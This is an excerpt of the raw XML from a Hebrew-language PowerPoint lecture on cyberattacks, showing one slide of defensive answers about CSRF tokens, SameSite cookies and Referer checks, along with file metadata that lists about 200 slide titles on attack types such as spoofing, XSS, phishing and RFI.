                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15EE0FC0-055A-4357-B6FF-A3200B2A641A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CSRF Token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא ערך ייחודי שמתווסף לכל טופס של האתר ונשלח עם הבקשה. השרת מאמת את הטוקן כדי לוודא שהבקשה מגיעה ממקור מהימן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הוסף את הטוקן לכל טופס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או בקשה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, והשרת יוודא את תקפותו לפני ביצוע הפעולה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מנצלת את ההתחברות של המשתמש לאתר על מנת לבצע פעולות בשמו מבלי שהוא ידע על כך. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לעומת זאת, מתמקדת בהזרקת קוד זדוני לתוך דף האינטרנט כדי לבצע התקפות ישירות על המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. ניתן לזהות התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על ידי חיפוש בקשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמתקבלות ללא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,CSRF Token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או על ידי בדיקה שהאתר לא מבצע אימות של מקור הבקשה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Origin</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. בקשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משמשות לרוב לקבלת מידע ואינן משנות נתונים בשרת, ולכן הן פחות מסוכנות. אך במקרים שבהם בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כן משנות נתונים, הן יכולות להיות מנוצלות לצורך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. הייתי ממליץ להתחיל בשימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF Tokens </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על כל טופס ובקשה, לעדכן את העוגיות לשימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וליישם בדיקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לוודא שהבקשות מגיעות מהמקור הנכון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6867334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סבון</Template>
  <TotalTime>953</TotalTime>
  <Words>19018</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>מסך רחב</PresentationFormat>
  <Paragraphs>1499</Paragraphs>
  <Slides>202</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202</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="206" baseType="lpstr">
      <vt:lpstr>Century Gothic</vt:lpstr>
      <vt:lpstr>Garamond</vt:lpstr>
      <vt:lpstr>Gisha</vt:lpstr>
      <vt:lpstr>סבון</vt:lpstr>
      <vt:lpstr>הרצאה 5</vt:lpstr>
      <vt:lpstr>תקיפות</vt:lpstr>
      <vt:lpstr>פרופיל תוקף Attacker Profiling</vt:lpstr>
      <vt:lpstr>סוגי תוקפים </vt:lpstr>
      <vt:lpstr>מאפיינים של פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך - מאפיינים של פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך - מאפיינים של פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך - מאפיינים של פרופיל תוקף</vt:lpstr>
      <vt:lpstr>כיצד יוצרים פרופיל תוקף?</vt:lpstr>
      <vt:lpstr>דוגמאות לקביעת פרופיל בעולם האמיתי</vt:lpstr>
      <vt:lpstr>המשך – פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך – פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך – פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך – פרופיל תוקף</vt:lpstr>
      <vt:lpstr>המשך – פרופיל תוקף</vt:lpstr>
      <vt:lpstr>שלבי ביצוע תקיפה</vt:lpstr>
      <vt:lpstr>שלב 1: איסוף מודיעין Reconnaissance</vt:lpstr>
      <vt:lpstr>שלב 2: סריקה Scanning</vt:lpstr>
      <vt:lpstr>שלב 3: גישה ראשונית Initial Access</vt:lpstr>
      <vt:lpstr>שלב 4: השגת אחיזה Establishing a Foothold</vt:lpstr>
      <vt:lpstr>שלב 5: הסלמת הרשאות Privilege Escalation</vt:lpstr>
      <vt:lpstr>שלב 6: תנועה רוחבית Lateral Movement</vt:lpstr>
      <vt:lpstr>שלב 7: יציאה Exfiltration and Covering Tracks</vt:lpstr>
      <vt:lpstr>המשך – שלבי ביצוע תקיפה</vt:lpstr>
      <vt:lpstr>המשך – שלבי ביצוע תקיפה (תשובות)</vt:lpstr>
      <vt:lpstr>המשך – שלבי ביצוע תקיפה (תשובות)</vt:lpstr>
      <vt:lpstr>המשך – שלבי ביצוע תקיפה (תשובות)</vt:lpstr>
      <vt:lpstr>המשך – שלבי ביצוע תקיפה (תשובות)</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מבוא לפרצות אבטחה</vt:lpstr>
      <vt:lpstr>1. גלישת חוצץ - Buffer Overflow</vt:lpstr>
      <vt:lpstr>2. הזרקת SQL - SQL Injection</vt:lpstr>
      <vt:lpstr>3. Cross-Site Scripting (XSS)</vt:lpstr>
      <vt:lpstr>4. Cross-Site Request Forgery (CSRF)</vt:lpstr>
      <vt:lpstr>5. Privilege Escalation  (הסלמת הרשאות)</vt:lpstr>
      <vt:lpstr>6.) Zero-Day Vulnerabilities פגיעויות יום אפס)</vt:lpstr>
      <vt:lpstr>7. ) Man-in-the-Middle (MitM) Attack התקפת אדם בתווך)</vt:lpstr>
      <vt:lpstr>שאלות – סוגי פרצות אבטחה </vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>זיוף כתובת MAC (MAC Spoofing)</vt:lpstr>
      <vt:lpstr>המשך – זיוף כתובת MAC</vt:lpstr>
      <vt:lpstr>המשך – זיוף כתובת MAC</vt:lpstr>
      <vt:lpstr>זיוף כתובת MAC –  "התחזות למכונה המועדפת"</vt:lpstr>
      <vt:lpstr>זיוף כתובת MAC הלכה למעשה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת MAC הלכה למעשה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת MAC הלכה למעשה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC שאלות</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC תשובות</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC שאלה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC תשובה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC תשובה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC תשובה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - MAC תשובה</vt:lpstr>
      <vt:lpstr>זיוף כתובת IP (IP Spoofing)</vt:lpstr>
      <vt:lpstr>המשך – זיוף כתובת IP</vt:lpstr>
      <vt:lpstr>המשך – זיוף כתובת IP</vt:lpstr>
      <vt:lpstr>זיוף כתובת - IP "התקפת DDoS מסורבת"</vt:lpstr>
      <vt:lpstr>זיוף כתובת IP הלכה למעשה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת IP הלכה למעשה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת IP - שאלות</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת IP - תשובות</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - IP שאלה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - IP תשובה</vt:lpstr>
      <vt:lpstr>המשך - זיוף כתובת - IP תשובה</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מהי התקפת אמצע?</vt:lpstr>
      <vt:lpstr>המשך – התקפת אמצע</vt:lpstr>
      <vt:lpstr>המשך – התקפת אמצע</vt:lpstr>
      <vt:lpstr>המשך – התקפת אמצע</vt:lpstr>
      <vt:lpstr>סוגי התקפות אמצע נוספות </vt:lpstr>
      <vt:lpstr>סוגי התקפות אמצע נוספות </vt:lpstr>
      <vt:lpstr>סוגי התקפות אמצע נוספות - טכניקות מתקדמות יותר </vt:lpstr>
      <vt:lpstr>סוגי התקפות אמצע נוספות - טכניקות מתקדמות יותר </vt:lpstr>
      <vt:lpstr>התקפת אמצע - שאלות</vt:lpstr>
      <vt:lpstr>התקפת אמצע - תשובות</vt:lpstr>
      <vt:lpstr>התקפת אמצע – שאלות חלק ב'</vt:lpstr>
      <vt:lpstr>התקפת אמצע – תשובות חלק ב'</vt:lpstr>
      <vt:lpstr>התקפת אמצע – שאלת קוד</vt:lpstr>
      <vt:lpstr>המשך - התקפת אמצע – שאלת קוד</vt:lpstr>
      <vt:lpstr>שאלה לש"ב</vt:lpstr>
      <vt:lpstr>שאלה לש"ב - המשך</vt:lpstr>
      <vt:lpstr>שאלה נוספת</vt:lpstr>
      <vt:lpstr>המשך - שאלה נוספת</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מהי התקפת מניעת שירות DoS</vt:lpstr>
      <vt:lpstr>המשך – התקפת מניעת שירות</vt:lpstr>
      <vt:lpstr>איך מתמודדים עם התקפות DoS</vt:lpstr>
      <vt:lpstr>המשך - התקפת מניעת שירות</vt:lpstr>
      <vt:lpstr>המשך - התקפת מניעת שירות</vt:lpstr>
      <vt:lpstr>המשך - התקפת מניעת שירות</vt:lpstr>
      <vt:lpstr>התקפת מניעת שירות - שאלות</vt:lpstr>
      <vt:lpstr>התקפת מניעת שירות - תשובות</vt:lpstr>
      <vt:lpstr>התקפת מניעת שירות – שאלת קוד</vt:lpstr>
      <vt:lpstr>התקפת מניעת שירות – תשובת קוד</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>התקפת XSS</vt:lpstr>
      <vt:lpstr>המשך - התקפת XSS </vt:lpstr>
      <vt:lpstr>סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>המשך - סוגי תקיפות XSS</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>התקפת HTTP Proxy </vt:lpstr>
      <vt:lpstr>המשך - התקפת HTTP Proxy </vt:lpstr>
      <vt:lpstr>איך מתבצעת התקפת ?HTTP Proxy</vt:lpstr>
      <vt:lpstr>דרכים להתגונן מהתקפת HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - התקפת HTTP Proxy </vt:lpstr>
      <vt:lpstr>המשך - התקפת HTTP Proxy </vt:lpstr>
      <vt:lpstr>כלים נוספים לתקיפת HTTP Proxy</vt:lpstr>
      <vt:lpstr>דרכים מתקדמות להתגוננות מ- HTTP Proxy </vt:lpstr>
      <vt:lpstr>המשך - דרכים מתקדמות להתגוננות מ- HTTP Proxy </vt:lpstr>
      <vt:lpstr>דוגמה מעשית: יצירת פרוקסי ויירוט תעבורה</vt:lpstr>
      <vt:lpstr>התקפת  HTTP Proxy- שאלות</vt:lpstr>
      <vt:lpstr>התקפת  HTTP Proxy- תשובות</vt:lpstr>
      <vt:lpstr>לקראת שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - שאלה רצינית על HTTP Proxy</vt:lpstr>
      <vt:lpstr>1. הזרקת URL HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - התקפה הלכה למעשה על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - התקפה הלכה למעשה על HTTP Proxy</vt:lpstr>
      <vt:lpstr>2. שימוש בשרת הפרוקסי לשליחת בקשות זדוניות</vt:lpstr>
      <vt:lpstr>המשך - התקפה הלכה למעשה על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - התקפה הלכה למעשה על HTTP Proxy</vt:lpstr>
      <vt:lpstr>המשך - התקפה הלכה למעשה על HTTP Proxy</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>Point-and-click metasploit</vt:lpstr>
      <vt:lpstr>המשך - Point-and-click metasploit</vt:lpstr>
      <vt:lpstr>המשך - Point-and-click metasploit</vt:lpstr>
      <vt:lpstr>המשך - Point-and-click metasploit</vt:lpstr>
      <vt:lpstr>המשך - Point-and-click metasploit</vt:lpstr>
      <vt:lpstr>המשך - Point-and-click metasploit</vt:lpstr>
      <vt:lpstr>התקנה והפעלת Metasploit</vt:lpstr>
      <vt:lpstr>המשך - התקנה והפעלת Metasploit</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מבוא להתקפות דיוג  (Phishing) </vt:lpstr>
      <vt:lpstr>סוגי התקפות דיוג</vt:lpstr>
      <vt:lpstr>המשך - התקפת דיוג</vt:lpstr>
      <vt:lpstr>כיצד להתגונן מפני התקפות דיוג</vt:lpstr>
      <vt:lpstr>טכניקות דיוג מתקדמות</vt:lpstr>
      <vt:lpstr>טכניקות מתקדמות להתגוננות מפני דיוג</vt:lpstr>
      <vt:lpstr>התקפת דיוג - שאלות</vt:lpstr>
      <vt:lpstr>התקפת דיוג - תשובות</vt:lpstr>
      <vt:lpstr>התקפת דיוג - תשובות</vt:lpstr>
      <vt:lpstr>התקפת דיוג - תשובות</vt:lpstr>
      <vt:lpstr>כלי להתקפת דיוג</vt:lpstr>
      <vt:lpstr>המשך - כלי להתקפת דיוג</vt:lpstr>
      <vt:lpstr>המשך - כלי להתקפת דיוג</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מבוא להפעלה זדונית של קבצים</vt:lpstr>
      <vt:lpstr>המשך – הפעלה זדונית של קבצים </vt:lpstr>
      <vt:lpstr>סוגי Malicious File Execution</vt:lpstr>
      <vt:lpstr>המשך - סוגי Malicious File Execution</vt:lpstr>
      <vt:lpstr>שיטות נפוצות להפצה של קבצים זדוניים</vt:lpstr>
      <vt:lpstr>הגנות והתמודדות עם Malicious File Execution</vt:lpstr>
      <vt:lpstr>שאלות - הפעלה זדונית של קבצים </vt:lpstr>
      <vt:lpstr>יצירת קוד זדוני:</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מה זה  ?Remote File Inclusion(RFI)</vt:lpstr>
      <vt:lpstr>כיצד RFI עובד?</vt:lpstr>
      <vt:lpstr>איך להתגונן מ-?RFI</vt:lpstr>
      <vt:lpstr>התקפות שרשרת (Chain Attacks) עם RFI</vt:lpstr>
      <vt:lpstr>סוגי קבצים זדוניים שניתן להעלות ב- RFI</vt:lpstr>
      <vt:lpstr>מניעת  RFIבאמצעות טכניקות מתקדמות</vt:lpstr>
      <vt:lpstr>זיהוי  RFIותגובה מהירה</vt:lpstr>
      <vt:lpstr>אבטחת פלטפורמות נפוצות ((CMS</vt:lpstr>
      <vt:lpstr>RFI - שאלות</vt:lpstr>
      <vt:lpstr>RFI - תשובות</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>Insecure Direct Object Reference (IDOR)</vt:lpstr>
      <vt:lpstr>המשך - IDOR</vt:lpstr>
      <vt:lpstr>המשך - IDOR</vt:lpstr>
      <vt:lpstr>כיצד למנוע IDOR</vt:lpstr>
      <vt:lpstr>המשך - IDOR  ב-APIs  </vt:lpstr>
      <vt:lpstr>IDOR  עם קשרי גומלין במערכות מורכבות</vt:lpstr>
      <vt:lpstr>טכניקות מניעתיות מתקדמות</vt:lpstr>
      <vt:lpstr>שאלות - IDOR</vt:lpstr>
      <vt:lpstr>תשובות - IDOR</vt:lpstr>
      <vt:lpstr>תרגול להמחשת IDOR</vt:lpstr>
      <vt:lpstr>המשך - תרגול להמחשת IDOR</vt:lpstr>
      <vt:lpstr>המשך - תרגול להמחשת IDOR</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr> Cross-Site Request Forgery (CSRF) </vt:lpstr>
      <vt:lpstr>המשך - CSRF</vt:lpstr>
      <vt:lpstr>מניעת CSRF</vt:lpstr>
      <vt:lpstr>איך להימנע מהתקפות CSRF</vt:lpstr>
      <vt:lpstr>שאלות - CSRF</vt:lpstr>
      <vt:lpstr>תשובות - CSRF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5</dc:title>
  <dc:creator>itest</dc:creator>
  <cp:lastModifiedBy>user</cp:lastModifiedBy>
  <cp:revision>89</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-07-31T09:16:31Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-11-03T13:50:53Z</dcterms:modified>
</cp:coreProperties>
</file>